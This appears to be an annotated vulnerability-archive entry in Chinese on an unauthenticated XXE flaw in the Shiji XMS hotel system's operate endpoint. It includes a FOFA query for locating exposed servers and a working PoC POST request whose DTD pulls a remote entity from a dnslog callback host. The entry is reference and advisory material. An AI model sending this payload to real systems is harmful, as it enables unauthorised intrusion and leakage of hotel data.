---
source: "wy876 漏洞文库"
title: "西软云XMS operate外部参数实体XXE迹象"
product: "西软云XMS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "XML解析器外部实体与出网条件；版本未知"
prerequisites: "无Cookie样例"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/vt5rnzir8sgdr1pz"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E8%A5%BF%E8%BD%AF%E4%BA%91XMS/%E8%A5%BF%E8%BD%AF%E4%BA%91XMSoperate%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"shiji-西软云XMS\""
id: "vw-a97c9c67b3f6ba124f28b4d4"
entity_id: "ve-a97c9c67b3f6ba124f28b4d4"
schema_version: "1"
---

# 西软云XMS operate外部参数实体XXE迹象

## 条目说明

- 对象与具体问题：西软云XMS；operate外部参数实体XXE迹象
- 版本、配置及部署条件：XML解析器外部实体与出网条件；版本未知
- 认证与权限前提：无Cookie样例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- DTD远程参数实体仅DNS/HTTP回连样例，不能等同内部敏感文件已读
- XML无根元素需解释错误解析期间触发条件；无结果/修复证据
- 删除2020酒店行业营销，保留解析配置前提

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
西软云XMS是基于云平台数据中心开发的支持多酒店、多语言、多平台的酒店管理系统。致力于以新一代云架构为国内四，五星级中高端酒店提供灵活、高度整合酒店业务，助力酒店智能转型升级。2020的开年突变，对酒店行业来讲，无疑是天降横祸。覆巢之下，焉有完卵，对酒店管理系统企业来说，则是增量市场的红利几乎消失，所有品牌都得在存量市场里搏杀，生存和创新，是2020年的头号命题。西软云XMS /XopServerRS/rest/futurehotel/operate接口处存在XML实体注入漏洞，未经身份认证的攻击者可利用此漏洞获取服务器内部敏感数据，使系统处于极不安全状态。

## 二、影响版本
+ 西软云XMS

## 三、资产测绘
+ fofa`app="shiji-西软云XMS"`
+ 特征


## 四、漏洞复现
```http
POST /XopServerRS/rest/futurehotel/operate HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36
Content-Length: 79
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml

<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://q26gls.dnslog.cn"> %remote;]>
```

> 请求长度说明：原资料 Content-Length 为 79；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vt5rnzir8sgdr1pz>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
